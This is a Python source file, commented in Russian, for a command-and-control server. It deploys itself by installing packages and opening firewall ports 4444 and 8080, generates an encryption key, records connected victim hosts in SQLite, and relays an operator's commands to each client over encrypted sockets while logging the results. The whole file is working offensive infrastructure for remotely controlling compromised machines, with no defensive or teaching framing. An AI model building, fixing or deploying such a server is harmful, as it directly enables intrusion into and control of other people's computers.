# corrected_c2_server.py - Исправленная версия с правильной структурой
import os
import sys
import subprocess
import socket
import sqlite3
import threading
import logging
import requests
from datetime import datetime
from cryptography.fernet import Fernet

# === КЛАСС ДЕПЛОЙМЕНТА ===
class C2Deployer:
    def __init__(self):
        self.setup_commands = {
            'ubuntu': [
                'apt update && apt upgrade -y',
                'apt install -y python3 python3-pip git sqlite3',
                'pip3 install cryptography requests',
                'ufw allow 4444/tcp',
                'ufw allow 8080/tcp',
                'ufw --force enable'
            ],
            'centos': [
                'yum update -y',
                'yum install -y python3 python3-pip git sqlite3',
                'pip3 install cryptography requests',
                'firewall-cmd --permanent --add-port=4444/tcp',
                'firewall-cmd --permanent --add-port=8080/tcp',
                'firewall-cmd --reload'
            ],
            'kali': [
                'apt update && apt upgrade -y',
                'apt install -y python3 python3-pip git sqlite3',
                'pip3 install cryptography requests',
                'ufw allow 4444/tcp',
                'ufw allow 8080/tcp'
            ]
        }
    
    def detect_os(self):
        """Определение операционной системы"""
        if os.name == 'nt':
            return 'windows'
        elif os.name == 'posix':
            try:
                with open('/etc/os-release', 'r') as f:
                    content = f.read().lower()
                    if 'ubuntu' in content:
                        return 'ubuntu'
                    elif 'centos' in content:
                        return 'centos'
                    elif 'kali' in content:
                        return 'kali'
                    elif 'debian' in content:
                        return 'ubuntu'  # Используем команды Ubuntu для Debian
            except:
                pass
        return 'ubuntu'  # По умолчанию Ubuntu
    
    def run_command(self, cmd):
        """Выполнение команды с проверкой"""
        try:
            print(f"[*] Executing: {cmd}")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Success: {cmd}")
                return True
            else:
                print(f"[-] Failed: {cmd} - {result.stderr}")
                return False
        except Exception as e:
            print(f"[-] Error executing {cmd}: {e}")
            return False
    
    def setup_dependencies(self):
        """Установка зависимостей"""
        os_type = self.detect_os()
        print(f"[*] Detected OS: {os_type}")
        
        if os_type not in self.setup_commands:
            print(f"[-] Unsupported OS: {os_type}")
            return False
        
        print("[+] Installing dependencies...")
        for cmd in self.setup_commands[os_type]:
            if not self.run_command(cmd):
                print(f"[-] Dependency installation failed")
                return False
        return True
    
    def check_network(self):
        """Проверка сетевых настроек"""
        print("[+] Checking network configuration...")
        
        # Проверка порта
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.bind(('0.0.0.0', 4444))
            print("[+] Port 4444 is available")
            sock.close()
            return True
        except OSError:
            print("[-] Port 4444 is already in use")
            sock.close()
            return False
    
    def get_public_ip(self):
        """Получение публичного IP"""
        try:
            response = requests.get('https://api.ipify.org', timeout=10)
            return response.text
        except:
            return "YOUR_SERVER_IP"
    
    def generate_config(self):
        """Генерация конфигурационного файла"""
        public_ip = self.get_public_ip()
        
        config_content = f'''# C2 Server Configuration
C2_SERVER = "0.0.0.0"
C2_PORT = 4444
PUBLIC_IP = "{public_ip}"
ENCRYPTION_KEY = "{Fernet.generate_key().decode()}"

# Database settings
DB_FILE = "c2_database.db"

# Logging
LOG_LEVEL = "INFO"
'''
        
        try:
            with open('c2_config.py', 'w') as f:
                f.write(config_content)
            print(f"[+] Configuration file created with public IP: {public_ip}")
            return True
        except Exception as e:
            print(f"[-] Failed to create config: {e}")
            return False
    
    def deploy(self):
        """Основной метод деплоймента"""
        print("=== C2 SERVER DEPLOYMENT ===")
        
        if not self.setup_dependencies():
            return False
        
        if not self.check_network():
            return False
        
        if not self.generate_config():
            return False
        
        print("\n[+] Deployment completed successfully!")
        print("[*] Next: Run 'python3 c2_server.py' to start the server")
        return True

# === КЛАСС БАЗЫ ДАННЫХ ===
class C2Database:
    def __init__(self, db_file="c2_database.db"):
        self.db_file = db_file
        self.conn = sqlite3.connect(db_file, check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        """Создание таблиц базы данных"""
        cursor = self.conn.cursor()
        
        # Таблица клиентов
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE,
                hostname TEXT,
                os TEXT,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT DEFAULT 'online'
            )
        ''')
        
        # Таблица команд
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_ip TEXT,
                command TEXT,
                result TEXT,
                timestamp TEXT,
                FOREIGN KEY (client_ip) REFERENCES clients (ip_address)
            )
        ''')
        
        self.conn.commit()
    
    def add_client(self, ip_address, hostname="Unknown", os="Unknown"):
        """Добавление клиента в базу"""
        cursor = self.conn.cursor()
        current_time = datetime.now().isoformat()
        
        cursor.execute('''
            INSERT OR REPLACE INTO clients 
            (ip_address, hostname, os, first_seen, last_seen, status)
            VALUES (?, ?, ?, COALESCE((SELECT first_seen FROM clients WHERE ip_address=?), ?), ?, ?)
        ''', (ip_address, hostname, os, ip_address, current_time, current_time, 'online'))
        
        self.conn.commit()
    
    def log_command(self, client_ip, command, result):
        """Логирование команды"""
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO commands (client_ip, command, result, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (client_ip, command, result, datetime.now().isoformat()))
        
        self.conn.commit()

# === ОСНОВНОЙ C2 СЕРВЕР ===
class C2Server:
    def __init__(self):
        # Загрузка конфигурации
        try:
            from c2_config import C2_SERVER, C2_PORT, ENCRYPTION_KEY
            self.host = C2_SERVER
            self.port = C2_PORT
            self.encryption_key = ENCRYPTION_KEY.encode()
        except ImportError:
            self.host = "0.0.0.0"
            self.port = 4444
            self.encryption_key = Fernet.generate_key()
        
        self.cipher = Fernet(self.encryption_key)
        self.db = C2Database()
        self.clients = {}
        
        # Настройка логирования
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('c2_server.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def handle_client(self, client_socket, client_address):
        """Обработка подключения клиента"""
        client_ip = client_address[0]
        self.logger.info(f"New connection from {client_ip}")
        
        try:
            # Регистрация клиента
            self.db.add_client(client_ip)
            self.clients[client_ip] = {
                'socket': client_socket,
                'connected_at': datetime.now(),
                'cipher': self.cipher
            }
            
            print(f"\n[+] New client connected: {client_ip}")
            print(f"[*] Total clients: {len(self.clients)}")
            
            while True:
                # Ожидание команды от оператора
                if client_ip in self.clients:
                    command = input(f"C2[{client_ip}]> ").strip()
                    
                    if command.lower() in ['exit', 'quit']:
                        break
                    elif command == '':
                        continue
                    
                    # Отправка команды клиенту
                    encrypted_command = self.cipher.encrypt(command.encode())
                    client_socket.send(encrypted_command)
                    
                    # Получение ответа
                    response_data = client_socket.recv(1024 * 1024)  # 1MB buffer
                    if response_data:
                        try:
                            decrypted_response = self.cipher.decrypt(response_data)
                            response_text = decrypted_response.decode('utf-8', errors='ignore')
                            print(f"Response from {client_ip}:\n{response_text}")
                            
                            # Логирование в базу
                            self.db.log_command(client_ip, command, response_text[:1000])  # Ограничение длины
                        except Exception as e:
                            print(f"Decryption error: {e}")
                    else:
                        print("No response from client")
                        
        except Exception as e:
            self.logger.error(f"Error with client {client_ip}: {e}")
        finally:
            # Очистка при отключении
            if client_ip in self.clients:
                del self.clients[client_ip]
            client_socket.close()
            self.logger.info(f"Client {client_ip} disconnected")
            print(f"[-] Client {client_ip} disconnected")
    
    def start(self):
        """Запуск C2 сервера"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)
            
            print(f"[*] C2 Server started on {self.host}:{self.port}")
            print("[*] Waiting for client connections...")
            print("[*] Encryption key:", self.encryption_key.decode())
            self.logger.info(f"C2 Server started on port {self.port}")
            
            while True:
                client_socket, client_address = server_socket.accept()
                
                # Запуск обработчика в отдельном потоке
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except KeyboardInterrupt:
            print("\n[*] Shutting down server...")
        except Exception as e:
            self.logger.error(f"Server error: {e}")
            print(f"[-] Server error: {e}")
        finally:
            server_socket.close()

# === ЗАПУСК ПРОГРАММЫ ===
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "deploy":
        # Режим деплоймента
        deployer = C2Deployer()
        deployer.deploy()
    else:
        # Проверка конфигурации
        if not os.path.exists('c2_config.py'):
            print("[!] Configuration file not found. Running deployment...")
            deployer = C2Deployer()
            if deployer.deploy():
                print("[+] Deployment successful. Starting server...")
            else:
                print("[-] Deployment failed. Please check errors above.")
                sys.exit(1)
        
        # Запуск сервера
        server = C2Server()
        server.start()
